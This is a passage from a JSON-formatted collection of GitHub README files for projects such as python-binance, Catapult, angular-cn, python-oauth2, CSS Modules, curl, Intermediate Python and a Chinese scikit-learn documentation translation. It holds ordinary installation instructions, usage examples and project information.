src=\"https:\/\/i.imgur.com\/jYZ7aUR.png\" alt=\"Merch!\"\/><\/a>\n<\/p>\n\n## Support \/ Development \/ Training \/ Consulting\n\nDo you need help with..\n\n  * Porting existing Flask and Django applications to Zappa?\n  * Building new applications and services that scale infinitely?\n  * Reducing your operations and hosting costs?\n  * Adding new custom features into Zappa?\n  * Training your team to use AWS and other server-less paradigms?\n\nGood news! We're currently available for remote and on-site consulting for small, large and enterprise teams. Please contact <miserlou@gmail.com> with your needs and let's work together!\n\n<br \/>\n<p align=\"center\">\n  <a href=\"https:\/\/gun.io\"><img src=\"http:\/\/i.imgur.com\/M7wJipR.png\" alt=\"Made by Gun.io\"\/><\/a>\n<\/p>\n"},{"repo":"\/catapult-project\/catapult","language":"HTML","readme_contents":"\n<!-- Copyright 2015 The Chromium Authors. All rights reserved.\n     Use of this source code is governed by a BSD-style license that can be\n     found in the LICENSE file.\n-->\nCatapult\n========\n\nCatapult is the home for several performance tools that span from gathering,\ndisplaying and analyzing performance data. This includes:\n\n * [Trace-viewer](\/tracing\/README.md)\n * [Telemetry](\/telemetry\/README.md)\n * [Performance Dashboard](\/dashboard\/README.md)\n * [Systrace](\/systrace\/README.md)\n * [Web Page Replay](\/web_page_replay_go\/README.md)\n\nThese tools were created by Chromium developers for performance analysis,\ntesting, and monitoring of Chrome, but they can also be used for analyzing and\nmonitoring websites, and eventually Android apps.\n\nContributing\n============\nPlease see [our contributor's guide](\/CONTRIBUTING.md)\n\n**[Current build status](https:\/\/build.chromium.org\/p\/client.catapult\/waterfall)**\n"},{"repo":"\/sammchardy\/python-binance","language":"Python","readme_contents":"================================\nWelcome to python-binance v0.7.4\n================================\n\nNote\n----\n\nI am working on a python3 version with async support to remove legacy dependencies and their related issues.\n\nI would appreciate if you could try out the `feature\/asyncio <https:\/\/github.com\/sammchardy\/python-binance\/tree\/feature\/asyncio>`_ branch and give your feedback.\n\n\n.. image:: https:\/\/img.shields.io\/pypi\/v\/python-binance.svg\n    :target: https:\/\/pypi.python.org\/pypi\/python-binance\n\n.. image:: https:\/\/img.shields.io\/pypi\/l\/python-binance.svg\n    :target: https:\/\/pypi.python.org\/pypi\/python-binance\n\n.. image:: https:\/\/img.shields.io\/travis\/sammchardy\/python-binance.svg\n    :target: https:\/\/travis-ci.org\/sammchardy\/python-binance\n\n.. image:: https:\/\/img.shields.io\/coveralls\/sammchardy\/python-binance.svg\n    :target: https:\/\/coveralls.io\/github\/sammchardy\/python-binance\n\n.. image:: https:\/\/img.shields.io\/pypi\/wheel\/python-binance.svg\n    :target: https:\/\/pypi.python.org\/pypi\/python-binance\n\n.. image:: https:\/\/img.shields.io\/pypi\/pyversions\/python-binance.svg\n    :target: https:\/\/pypi.python.org\/pypi\/python-binance\n\nThis is an unofficial Python wrapper for the `Binance exchange REST API v1\/3 <https:\/\/github.com\/binance-exchange\/binance-official-api-docs>`_. I am in no way affiliated with Binance, use at your own risk.\n\nIf you came here looking for the `Binance exchange <https:\/\/www.binance.com\/?ref=10099792>`_ to purchase cryptocurrencies, then `go here <https:\/\/www.binance.com\/?ref=10099792>`_. If you want to automate interactions with Binance stick around.\n\nIf you're interested in Binance's new DEX Binance Chain see my `python-binance-chain library <https:\/\/github.com\/sammchardy\/python-binance-chain>`_\n\nSource code\n  https:\/\/github.com\/sammchardy\/python-binance\n\nDocumentation\n  https:\/\/python-binance.readthedocs.io\/en\/latest\/\n\nBinance API Telegram\n  https:\/\/t.me\/binance_api_english\n\nBlog with examples\n  https:\/\/sammchardy.github.io\n\nMake sure you update often and check the `Changelog <https:\/\/python-binance.readthedocs.io\/en\/latest\/changelog.html>`_ for new features and bug fixes.\n\nFeatures\n--------\n\n- Implementation of all General, Market Data and Account endpoints.\n- Simple handling of authentication\n- No need to generate timestamps yourself, the wrapper does it for you\n- Response exception handling\n- Websocket handling with reconnection and multiplexed connections\n- Symbol Depth Cache\n- Historical Kline\/Candle fetching function\n- Withdraw functionality\n- Deposit addresses\n- Margin Trading\n\nQuick Start\n-----------\n\n`Register an account with Binance <https:\/\/www.binance.com\/register.html?ref=10099792>`_.\n\n`Generate an API Key <https:\/\/www.binance.com\/userCenter\/createApi.html>`_ and assign relevant permissions.\n\n.. code:: bash\n\n    pip install python-binance\n\n\n.. code:: python\n\n    from binance.client import Client\n    client = Client(api_key, api_secret)\n\n    # get market depth\n    depth = client.get_order_book(symbol='BNBBTC')\n\n    # place a test market buy order, to place an actual order use the create_order function\n    order = client.create_test_order(\n        symbol='BNBBTC',\n        side=Client.SIDE_BUY,\n        type=Client.ORDER_TYPE_MARKET,\n        quantity=100)\n\n    # get all symbol prices\n    prices = client.get_all_tickers()\n\n    # withdraw 100 ETH\n    # check docs for assumptions around withdrawals\n    from binance.exceptions import BinanceAPIException, BinanceWithdrawException\n    try:\n        result = client.withdraw(\n            asset='ETH',\n            address='<eth_address>',\n            amount=100)\n    except BinanceAPIException as e:\n        print(e)\n    except BinanceWithdrawException as e:\n        print(e)\n    else:\n        print(\"Success\")\n\n    # fetch list of withdrawals\n    withdraws = client.get_withdraw_history()\n\n    # fetch list of ETH withdrawals\n    eth_withdraws = client.get_withdraw_history(asset='ETH')\n\n    # get a deposit address for BTC\n    address = client.get_deposit_address(asset='BTC')\n\n    # start aggregated trade websocket for BNBBTC\n    def process_message(msg):\n        print(\"message type: {}\".format(msg['e']))\n        print(msg)\n        # do something\n\n    from binance.websockets import BinanceSocketManager\n    bm = BinanceSocketManager(client)\n    bm.start_aggtrade_socket('BNBBTC', process_message)\n    bm.start()\n\n    # get historical kline data from any date range\n\n    # fetch 1 minute klines for the last day up until now\n    klines = client.get_historical_klines(\"BNBBTC\", Client.KLINE_INTERVAL_1MINUTE, \"1 day ago UTC\")\n\n    # fetch 30 minute klines for the last month of 2017\n    klines = client.get_historical_klines(\"ETHBTC\", Client.KLINE_INTERVAL_30MINUTE, \"1 Dec, 2017\", \"1 Jan, 2018\")\n\n    # fetch weekly klines since it listed\n    klines = client.get_historical_klines(\"NEOBTC\", Client.KLINE_INTERVAL_1WEEK, \"1 Jan, 2017\")\n\nFor more `check out the documentation <https:\/\/python-binance.readthedocs.io\/en\/latest\/>`_.\n\nDonate\n------\n\nIf this library helped you out feel free to donate.\n\n- ETH: 0xD7a7fDdCfA687073d7cC93E9E51829a727f9fE70\n- LTC: LPC5vw9ajR1YndE1hYVeo3kJ9LdHjcRCUZ\n- NEO: AVJB4ZgN7VgSUtArCt94y7ZYT6d5NDfpBo\n- BTC: 1Dknp6L6oRZrHDECRedihPzx2sSfmvEBys\n\nOther Exchanges\n---------------\n\nIf you use `Binance Chain <https:\/\/testnet.binance.org\/>`_ check out my `python-binance-chain <https:\/\/github.com\/sammchardy\/python-binance-chain>`_ library.\n\nIf you use `Kucoin <https:\/\/www.kucoin.com\/?rcode=E42cWB>`_ check out my `python-kucoin <https:\/\/github.com\/sammchardy\/python-kucoin>`_ library.\n\nIf you use `Allcoin <https:\/\/www.allcoin.com\/Account\/RegisterByPhoneNumber\/?InviteCode=MTQ2OTk4MDgwMDEzNDczMQ==>`_ check out my `python-allucoin <https:\/\/github.com\/sammchardy\/python-allcoin>`_ library.\n\nIf you use `IDEX <https:\/\/idex.market>`_ check out my `python-idex <https:\/\/github.com\/sammchardy\/python-idex>`_ library.\n\nIf you use `Quoinex <https:\/\/accounts.quoinex.com\/sign-up?affiliate=PAxghztC67615>`_\nor `Qryptos <https:\/\/accounts.qryptos.com\/sign-up?affiliate=PAxghztC67615>`_ check out my `python-quoine <https:\/\/github.com\/sammchardy\/python-quoine>`_ library.\n\nIf you use `BigONE <https:\/\/big.one>`_ check out my `python-bigone <https:\/\/github.com\/sammchardy\/python-bigone>`_ library.\n\n.. image:: https:\/\/analytics-pixel.appspot.com\/UA-111417213-1\/github\/python-binance?pixel&useReferer\n"},{"repo":"\/angular\/angular-cn","language":"HTML","readme_contents":"# Angular.io\nAngular.io is site for Angular 2 **documentation** . \n\nThis site also includes links to other helpful angular resources including \nAngular 2, Angular 1, Angular Material, and AngularFire.\n\n## Issues\n\nPlease file **Developer Guide, Cookbook, and code sample issues _only_** in this \n[Angular.io](https:\/\/github.com\/angular\/angular.io\/issues) github repo.\n\n**Angular API issues, cheatsheet corrections, feature requests, defect reports, and technical questions** concerning Angular itself\nbelong in the [**angular source code**](https:\/\/github.com\/angular\/angular\/issues) github repo.\nWe can't handle those topics here and will ask you to re-post them on the angular repo.\n\n## How you can help\n\nFiling issues is helpful but **pull requests** that improve the docs are even better!\n\nLearn how to [contribute to Angular.io](https:\/\/github.com\/angular\/angular.js\/blob\/master\/CONTRIBUTING.md).\n\n## Development Setup\nThis site relies heavily on node and npm.\n\n1. Make sure you are using the latest node and npm; \nif not install [nvm](https:\/\/github.com\/creationix\/nvm) to get node going on your machine.\n\n1. install these npm packages *globally*: `npm install -g harp gulp protractor`\n\n1. clone this repo and the [angular source code repo](https:\/\/github.com\/angular\/angular) to the same parent directory.\nThe two cloned repo directories must be sibling.\n\n1. cd into root directory `Angular.io\/`\n\n1. install the *all-docs* local packages by running `npm install`\n> If running node v.5+, you probably must rebuild `node-sass` in a separate step: `npm rebuild node-sass`\n\n1. See [below](#code-sample-development) for code sample development preparation.\n\n## Content Development\nAll documentation content is written in Jade which has [its own syntax](http:\/\/jade-lang.com\/reference\/).\nBe aware of the strict demands imposed by this significant-whitespace language.\nWe strongly recommend running one of the gulp `serve-and-sync` commands [described below](#serve-and-sync)\nwhile editing content so you can see the effect of your changes *as you type*.\n\nThe documentation relies on specific styles and mixins. \nLearn about those in the [documentation styleguide](https:\/\/angular.io\/docs\/ts\/latest\/styleguide.html).\n\nThe jade documentation files are language-specific directories under either `public\/docs\/`.\nFor example, all of the TypeScript docs are in `public\/docs\/ts\/latest`, e.g.\n- `public\/docs\/ts\/latest\/quickstart.jade`\n- `public\/docs\/ts\/latest\/guide\/architecture.jade`\n- `public\/docs\/ts\/latest\/cookbook\/component-communication.jade`\n- `public\/docs\/ts\/latest\/tutorial\/toh-pt5.jade`\n\n### Local server with watches and browser reload\n 1. cd into root directory `Angular.io\/`\n 1. run `gulp serve-and-sync`\n 1. browser will launch on localhost:3000 and stay refreshed automatically.\n\n<a id=\"serve-and-sync\"><\/a>\nIf you are only going to work on a specific part of the docs, such as the dev guide, then you can use one of the more specific gulp tasks to only watch those parts of the file system:\n\n* `gulp serve-and-sync` : watch all the local Jade\/Sass files, the API source and examples, and the dev guide files\n* `gulp serve-and-sync-api` : watch only the API source and example files\n* `gulp serve-and-sync-devguide` : watch only the dev guide files\n* `gulp build-and-serve` : watch only the local Jade\/Sass files\n\n## Code Sample Development\n\nAll documentation is supported by sample code and plunkers. \nSuch code resides in the `public\/docs\/_examples` directory, under chapter-specific directories, further divided by language track.\n\nFor example, the TypeScript QuickStart sample is in `public\/docs\/_examples\/quickstart\/ts`.\n\nAll samples are in a consistent directory structure using the same styles and the same npm packages, including the latest release of Angular 2.\nThis consistency is possible in part thanks to gulp-driven tooling. \nTo run the samples locally and confirm that they work properly, \ntake the following extra steps to prepare the environment:\n\n1. cd to `public\/docs\/_examples`\n\n1. install the canonical node packages for all samples by running `npm install`\n\n1. cd back up to `Angular.io` root: `cd ..\/..\/..`\n\n1. run `gulp add-example-boilerplate` (elevate to admin on Windows) \nto copy canonical files to the sample directories and create symlinks there for node_modules and typings. \n\nNow cd into any particular sample's language directory (e.g., `public\/docs\/_examples\/quickstart\/ts`) and try:\n- `npm start`  to simultaneously compile-with-watch and serve-in-browser-with-watch\n- `npm run tsc` to compile only\n- `npm run lite` to serve-and-watch in browser\n\nLook at the scripts in `package.json` for other options.\nAlso, open any `plunkr.no-link.html` to see the code execute in plunker\n(you may have to run `gulp build-plunkers` first to create\/update).\n\n### Sample end-to-end tests\n\nAll samples should be covered to some degree by end-to-end tests:\n- `gulp run-e2e-tests` to run all TypeScript and JavaScript tests\n- `gulp run-e2e-tests --lang=dart` to run all Dart tests\n- `gulp run-e2e-tests --lang=all` to run TypeScript, JavaScript, and Dart tests\n- `gulp run-e2e-tests --filter=quickstart` to filter the examples to run, by name\n- `gulp run-e2e-tests --fast` to ignore npm install, webdriver update and boilerplate copy\n\nAny combination of options is possible.\n\n\n## Technology Used\n- Angular 1.x: The production ready version of Angular\n- Angular Material: An implementation of Material Design in Angular.js\n- Gulp: node-based tooling\n- Harp: The static web server with built-in preprocessing.\n- Sass: A professional grade CSS extension language\n- Normalize: A modern, HTML5-ready alternative to CSS resets\n- Grids: A highly customizable CSS Grid Framework built with Sass\n- Prettify: A JS module and CSS for syntax highlighting of source code snippets.\n- Icomoon: Custom built icon fonts\n\n\n## License\nPowered by Google \u00a92010-2016. Code licensed under an [MIT-style License](https:\/\/github.com\/angular.io\/blob\/master\/LICENSE). Documentation licensed under [CC BY 4.0](http:\/\/creativecommons.org\/licenses\/by\/4.0\/).\n"},{"repo":"\/joestump\/python-oauth2","language":"Python","readme_contents":"[![Join the chat at https:\/\/gitter.im\/joestump\/python-oauth2](https:\/\/img.shields.io\/badge\/gitter-join%20chat-1dce73.svg?style=flat-square)](https:\/\/gitter.im\/joestump\/python-oauth2?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Build Status](http:\/\/img.shields.io\/travis-ci\/joestump\/python-oauth2.png?branch=master&style=flat-square)](https:\/\/travis-ci.org\/joestump\/python-oauth2) [![Coverage](https:\/\/img.shields.io\/codecov\/c\/github\/joestump\/python-oauth2.svg?style=flat-square)](https:\/\/codecov.io\/gh\/joestump\/python-oauth2) ![Number of issues](https:\/\/img.shields.io\/github\/issues\/joestump\/python-oauth2.svg?style=flat-square) ![Licence MIT](https:\/\/img.shields.io\/badge\/license-MIT-blue.svg?style=flat-square)\n\n## Note: This library implements OAuth 1.0 and *not OAuth 2.0*. \n\n# Overview\npython-oauth2 is a python oauth library fully compatible with python versions: 2.6, 2.7, 3.3 and 3.4. This library is depended on by many other downstream packages such as Flask-Oauth.\n\n# Installing\n\nYou can install `oauth2` via [the PIP package](https:\/\/pypi.python.org\/pypi\/oauth2). \n\n    $ pip install oauth2\n    \nWe recommend using [virtualenv](https:\/\/virtualenv.pypa.io\/en\/latest\/).\n\n# Examples\n\nExamples can be found in the [wiki](https:\/\/github.com\/joestump\/python-oauth2\/wiki)\n\n# Running tests\nYou can run tests using the following at the command line:\n\n    $ pip install -r requirements.txt\n    $ python setup.py test\n\n\n# History\n\nThis code was originally forked from [Leah Culver and Andy Smith's oauth.py code](http:\/\/github.com\/leah\/python-oauth\/). Some of the tests come from a [fork by Vic Fryzel](http:\/\/github.com\/shellsage\/python-oauth), while a revamped Request class and more tests were merged in from [Mark Paschal's fork](http:\/\/github.com\/markpasc\/python-oauth). A number of notable differences exist between this code and its forefathers:\n\n* 100% unit test coverage.\n* The <code>DataStore<\/code> object has been completely ripped out. While creating unit tests for the library I found several substantial bugs with the implementation and confirmed with Andy Smith that it was never fully baked.\n* Classes are no longer prefixed with <code>OAuth<\/code>.\n* The <code>Request<\/code> class now extends from <code>dict<\/code>.\n* The library is likely no longer compatible with Python 2.3.\n* The <code>Client<\/code> class works and extends from <code>httplib2<\/code>. It's a thin wrapper that handles automatically signing any normal HTTP request you might wish to make.\n"},{"repo":"\/kaiye\/kaiye.github.com","language":"HTML","readme_contents":"![](https:\/\/img.shields.io\/badge\/\u6709\u7406\u60f3-+1-brightgreen.svg)\n![](https:\/\/img.shields.io\/badge\/\u7231\u5b66\u4e60-+1-brightgreen.svg)\n![](https:\/\/img.shields.io\/badge\/\u5b9e\u529b\u6d3e-+1-brightgreen.svg)\n\n## \u7b80\u4ecb\n\n\u7ad9\u70b9\uff1a [yekai.net](http:\/\/yekai.net)\n\n\u5fae\u4fe1\u516c\u4f17\u53f7\uff1a \u300c\u732b\u54e5\u5b66\u524d\u73ed\u300d   \n![](img\/imgxqb.jpg)\n\n"},{"repo":"\/css-modules\/css-modules","language":null,"readme_contents":"<img src=\"https:\/\/raw.githubusercontent.com\/css-modules\/logos\/master\/css-modules-logo.png\" width=\"150\" height=\"150\" \/>\n\n# CSS Modules\n\nA **CSS Module** is a CSS file in which all class names and animation names are scoped locally by default. All URLs (`url(...)`) and `@imports` are in module request format (`.\/xxx` and `..\/xxx` means relative, `xxx` and `xxx\/yyy` means in modules folder, i. e. in `node_modules`).\n\nCSS Modules compile to a low-level interchange format called ICSS or [Interoperable CSS](https:\/\/github.com\/css-modules\/icss), but are written like normal CSS files:\n\n``` css\n\/* style.css *\/\n.className {\n  color: green;\n}\n```\n\nWhen importing the **CSS Module** from a JS Module, it exports an object with all mappings from local names to global names.\n\n``` js\nimport styles from \".\/style.css\";\n\/\/ import { className } from \".\/style.css\";\n\nelement.innerHTML = '<div class=\"' + styles.className + '\">';\n```\n\n## Naming\n\nFor local class names camelCase naming is recommended, but not enforced.\n\n> This is recommended because the common alternative, kebab-casing may cause unexpected behavior when trying to access style.class-name as a dot notation. You can still work around kebab-case with bracket notation (eg. `style['class-name']`) but `style.className` is cleaner.\n\n## Exceptions\n\n`:global` switches to global scope for the current selector respective identifier. `:global(.xxx)` respective `@keyframes :global(xxx)` declares the stuff in parenthesis in the global scope.\n\nSimilarly, `:local` and `:local(...)` for local scope.\n\nIf the selector is switched into global mode, global mode is also activated for the rules. (This allows us to make `animation: abc;` local.)\n\nExample: `.localA :global .global-b .global-c :local(.localD.localE) .global-d`\n\n## Composition\n\nIt's possible to compose selectors.\n\n``` css\n.className {\n  color: green;\n  background: red;\n}\n\n.otherClassName {\n  composes: className;\n  color: yellow;\n}\n```\n\nThere can be multiple `composes` rules, but `composes` rules must be before other rules. Extending works only for local-scoped selectors and only if the selector is a single class name. When a class name composes another class name, the **CSS Module** exports both class names for the local class. This can add up to multiple class names.\n\nIt's possible to compose multiple classes with `composes: classNameA classNameB;`.\n\n## Dependencies\n\n### Composing from other files\n\nIt's possible to compose class names from other **CSS Modules**.\n\n``` css\n.otherClassName {\n  composes: className from \".\/style.css\";\n}\n```\n\nNote that when composing multiple classes from different files the order of appliance is *undefined*. Make sure to not define different values for the same property in multiple class names from different files when they are composed in a single class.\n\nNote that composing should not form a circular dependency. Elsewise it's *undefined* whether properties of a rule override properties of a composed rule. The module system may emit an error.\n\nBest if classes do a single thing and dependencies are hierarchic.\n\n### Composing from global class names\n\nIt's possible to compose from **global** class names.\n\n```css\n.otherClassName {\n  composes: globalClassName from global;\n}\n```\n\n## Usage with preprocessors\n\nPreprocessors can make it easy to define a block global or local.\n\ni. e. with less.js\n\n``` less\n:global {\n  .global-class-name {\n    color: green;\n  }\n}\n```\n\n## Why?\n\n**modular** and **reusable** CSS!\n\n* No more conflicts.\n* Explicit dependencies.\n* No global scope.\n\n## Examples\n\n* [css-modules\/webpack-demo](https:\/\/github.com\/css-modules\/webpack-demo)\n* [outpunk\/postcss-modules-example](https:\/\/github.com\/outpunk\/postcss-modules-example)\n* [Theming](docs\/theming.md)\n* [css-modules\/browserify-demo](https:\/\/github.com\/css-modules\/browserify-demo)\n* [x-team\/starting-css-modules](https:\/\/github.com\/x-team\/starting-css-modules)\n\n## History\n\n* 04\/2015: `placeholders` feature in css-loader (webpack) allows local scoped selectors (later renamed to `local scope`) by @sokra\n* 05\/2015: `postcss-local-scope` enables `local scope` by default (see [blog post](https:\/\/medium.com\/seek-ui-engineering\/the-end-of-global-css-90d2a4a06284)) by @markdalgleish\n* 05\/2015: `extends` feature in css-loader allow to compose local or imported class names by @sokra\n* 05\/2015: First CSS Modules spec document and github organization with @sokra, @markdalgleish and @geelen\n* 06\/2015: `extends` renamed to `composes`\n* 06\/2015: PostCSS transformations to transform CSS Modules into an intermediate format (ICSS)\n* 06\/2015: Spec for ICSS as common implementation format for multiple module systems by @geelen\n* 06\/2015: Implementation for jspm by @geelen and @guybedford\n* 06\/2015: Implementation for browserify by @joshwnj, @joshgillies and @markdalgleish\n* 06\/2015: webpack's css-loader implementation  updated to latest spec by @sokra\n\n\n## Implementations\n\n### webpack\n\nWebpack's [css-loader](https:\/\/github.com\/webpack\/css-loader) in module mode replaces every local-scoped identifier with a global unique name (hashed from module name and local identifier by default) and exports the used identifier.\n\nExtending adds the source class name(s) to the exports.\n\nExtending from other modules first imports the other module and then adds the class name(s) to the exports.\n\n### Server-side and static websites\n\n[PostCSS-Modules](https:\/\/github.com\/outpunk\/postcss-modules) allows to use CSS Modules for static builds and the server side with Ruby, PHP or any other language or framework.\n"},{"repo":"\/curl\/curl","language":"C","readme_contents":"                                  _   _ ____  _\n                              ___| | | |  _ \\| |\n                             \/ __| | | | |_) | |\n                            | (__| |_| |  _ <| |___\n                             \\___|\\___\/|_| \\_\\_____|\n\nREADME\n\n  Curl is a command line tool for transferring data specified with URL\n  syntax. Find out how to use curl by reading the curl.1 man page or the\n  MANUAL document. Find out how to install Curl by reading the INSTALL\n  document.\n\n  libcurl is the library curl is using to do its job. It is readily\n  available to be used by your software. Read the libcurl.3 man page to\n  learn how!\n\n  You find answers to the most frequent questions we get in the FAQ document.\n\n  Study the COPYING file for distribution terms and similar. If you distribute\n  curl binaries or other binaries that involve libcurl, you might enjoy the\n  LICENSE-MIXING document.\n\nCONTACT\n\n  If you have problems, questions, ideas or suggestions, please contact us\n  by posting to a suitable mailing list. See https:\/\/curl.haxx.se\/mail\/\n\n  All contributors to the project are listed in the THANKS document.\n\nWEB SITE\n\n  Visit the curl web site for the latest news and downloads:\n\n        https:\/\/curl.haxx.se\/\n\nGIT\n\n  To download the very latest source off the GIT server do this:\n\n    git clone https:\/\/github.com\/curl\/curl.git\n\n  (you'll get a directory named curl created, filled with the source code)\n\nSECURITY PROBLEMS\n\n  Report suspected security problems via our HackerOne page and not in public!\n\n    https:\/\/hackerone.com\/curl\n\nNOTICE\n\n  Curl contains pieces of source code that is Copyright (c) 1998, 1999\n  Kungliga Tekniska H\u00f6gskolan. This notice is included here to comply with the\n  distribution terms.\n"},{"repo":"\/yasoob\/intermediatePython","language":"Python","readme_contents":"![Intermediate Python Book Cover](_static\/cover.png)\n\nIntermediate Python\n===================\n\nPython is an amazing language with a strong and friendly community of programmers. However, there is a lack of documentation on what to learn after getting the basics of Python down your throat. Through this book I aim to solve this problem. I will give you bits of information about some interesting topics which you can further explore.\n\nThe topics which are discussed in this book will open your mind to some nice corners of Python language. This book is an outcome of my desire to have something like this when I was beginning to learn Python.\n\nIf you are a beginner, intermediate or even an advanced programmer there is something for you in this book.\n\nPlease note that this book is not a tutorial and does not teach you Python. The topics are not explained in-depth and only the minimum required information is given.\n\nI am sure you are as excited as I am. So, let\u2019s start!\n\nNote: This book is a work in progress. If you find anything which you can further improve (I know you will find a lot of stuff) then kindly submit a pull request. :)\n\nMoreover, if you want to add more content to this book then kindly submit a pull request and I will be more than happy to merge it. :+1:\n\n-------------------\n\n**Note:** If you want to tip me for my work then you can buy the donation version of this book from [Gumroad](https:\/\/gum.co\/intermediate_python). Apart from that, if this book somehow helps you then kindly share your experience with [me](mailto:yasoob.khld@gmail.com). I would really appreciate it.\n\n-------------------\n\nTable of Contents:\n------------------\n1) Programmer tools\n    - [Virtual Environment](virtual_environment.rst)\n    - [Debugging](debugging.rst)\n    - [Object introspection](object_introspection.rst)\n2) Syntax\n    - [Exceptions](exceptions.rst)\n    - [For - Else](for_-_else.rst)\n    - [Ternary Operators](ternary_operators.rst)\n    - [Global & Return](global_&_return.rst)\n    - [Open function](open_function.rst)\n    - [\\*args and \\*\\*kwargs](args_and_kwargs.rst)\n    - [Context managers](context_managers.rst)\n3) Functional programming\n    - [Enumerate](enumerate.rst)\n    - [Lambdas](lambdas.rst)\n    - [``set`` Data Structure](set_-_data_structure.rst)\n    - [Map & Filter](map_filter.rst)\n    - [Comprehensions](comprehensions.rst)\n4) Data structures\n    - [Generators](generators.rst)\n    - [Coroutines](coroutines.rst)\n    - [Classes](classes.rst)\n5) Data types\n    - [Collections](collections.rst)\n    - [Mutation](mutation.rst)\n    - [\\_\\_slots\\_\\_ Magic](__slots__magic.rst)\n6) Decorators\n    - [What is a decorator?](decorators.rst)\n    - [Function caching](function_caching.rst)\n7) Extras\n    - [One Liners](one_liners.rst)\n    - [Targeting Python 2+3](targeting_python_2_3.rst)\n    - [Python C extensions](python_c_extension.rst)\n\nAuthor:\n------\n\n- [Muhammad Yasoob Ullah Khalid](https:\/\/github.com\/yasoob)\n\nAcknowledgement:\n----------------\n\n- [Philipp Hagemeister](https:\/\/github.com\/phihag):\n\nHe wrote the chapter on Open function. Thanks Philipp! :+1:\n\nTranslation:\n------------\nIf you want to translate this book in any other language then kindly let [me know](mailto:yasoob.khld@gmail.com). I would love your contribution. The currently translated versions are listed below:\n\n- [Chinese](https:\/\/github.com\/eastlakeside\/interpy-zh)\n- [Russian](https:\/\/github.com\/lancelote\/interpy-ru)\n- [Korean](https:\/\/github.com\/DDanggle\/interpy-kr)\n- [Portuguese](https:\/\/github.com\/joanasouza\/intermediatePython)\n\nLicense:\n-------\n\nThis book is released under the [following](http:\/\/creativecommons.org\/licenses\/by-nc-sa\/4.0\/) CC license (CC BY-NC-SA 4.0).\n\nIf you end up using\/recommending this book to someone then kindly [let me know](mailto:yasoob.khld@gmail.com). :smile:\n\n\n"},{"repo":"\/lzjqsdd\/scikit-learn-doc-cn","language":"HTML","readme_contents":"# scikit-learn-doc-cn\n\n[![Build Status](https:\/\/travis-ci.org\/lzjqsdd\/scikit-learn-doc-cn.svg?branch=master)](https:\/\/travis-ci.org\/lzjqsdd\/scikit-learn-doc-cn) ![Build Status](https:\/\/img.shields.io\/badge\/sklearn-0.17stable-brightgreen.svg)\t![Build Status](https:\/\/img.shields.io\/badge\/python-2.7.6-brightgreen.svg)\n\nsklearn\u5e93\u4f5c\u4e3a\u76ee\u524d\u673a\u5668\u5b66\u4e60\u975e\u5e38\u6d41\u884c\u7684python\u5e93\uff0c\u4e00\u4e2a\u6613\u8bfb\u7684\u6587\u6863\u66f4\u6709\u52a9\u4e8e\u5de5\u5177\u5e93\u7684\u7406\u89e3\u548c\u4f7f\u7528\uff0c\u867d\u7136\u505a\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u5b66\u751f\u548c\u5de5\u7a0b\u5e08\u9605\u8bfb\u82f1\u6587\u5e76\u6ca1\u6709\u5f88\u5927\u538b\u529b\uff0c\u4f46\u662f\u5728\u9605\u8bfb\u901f\u5ea6\u4e0a\u8fd8\u662f\u4f1a\u6709\u4e9b\u5f71\u54cd\u3002\n\u5bfb\u627e\u5df2\u4e45\u6ca1\u627e\u5230\u76f8\u5173\u7684\u4e2d\u6587\u6587\u6863\uff0c\u800c\u4e14\u7ffb\u8bd1\u7684\u8fc7\u7a0b\u4e5f\u662f\u5bf9\u77e5\u8bc6\u719f\u6089\u7684\u8fc7\u7a0b\uff0c\u60a8\u53ef\u4ee5\u5728\u5b66\u4e60\u67d0\u4e00\u4e2a\u7ae0\u8282\u7684\u8fc7\u7a0b\u987a\u4fbf\u7ffb\u8bd1\u4e00\u4e0b\u5c31\u53ef\u4ee5\u8d21\u732e\u81ea\u5df1\u7684\u529b\u91cf\u3002\n\n*\u6b22\u8fce\u5927\u5bb6\u8e0a\u8dc3\u52a0\u5165\uff01\u5982\u679c\u6709\u66f4\u597d\u7684\u7ffb\u8bd1\u7ec4\u7ec7\u5f62\u5f0f\u4e5f\u6b22\u8fce\u63d0\u51fa\uff01*\n\n**\u52a0\u5165\u5fae\u4fe1\u7fa4**\n\n![sklearn_wechat](https:\/\/raw.githubusercontent.com\/lzjqsdd\/scikit-learn-doc-cn\/master\/sklearn.PNG)\n\n*\u4e2d\u6587\u6587\u6863\u5730\u5740:[sklearn.lzjqsdd.com](http:\/\/sklearn.lzjqsdd.com)\n\n# \u7ffb\u8bd1\u8ba1\u5212\n\n| \u56fe\u6807  |  \u72b6\u6001 |\n|:----------------|:------------:|\n| ![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)| \u7ffb\u8bd1\u4e2d|\n| ![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| \u7ffb\u8bd1\u7ed3\u675f|\n| ![Build Status](https:\/\/img.shields.io\/badge\/translate-undo-lightgray.svg)| \u6682\u672a\u5f00\u59cb|\n\n\n## \u7b2c\u4e00\u9636\u6bb5\n\u76f8\u5173\u7b97\u6cd5\u793a\u4f8b\u7a0b\u5e8f\u7684\u7ffb\u8bd1\uff0c\u4f4d\u4e8emodules\u4e0b\uff0c\u5177\u4f53\u5217\u8868\u5982\u4e0b\uff1a\n\n\n| \u6587\u4ef6                | \u7ffb\u8bd1\u72b6\u6001        | \u8d21\u732e\u8005\n|:------------------- |:-------------| :-------:|\n| linear_model.rst    | ![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg) | lzjqsdd |\n| biclustering.rst    | ![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)    | alingse |\n| calibration.rst | ![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg) |woshikangfei| \n| classes.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg) |woshikangfei|\n| clustering.rst | ![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|huangbinapple|\n| computational_performance.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg) | iphyer |\n| covariance.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| RobinSeaside |\n| cross_decomposition.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|muyeby|\n| cross_validation.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| LianYun |\n| decomposition.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-undo-lightgray.svg)| heyuanhao |\n| 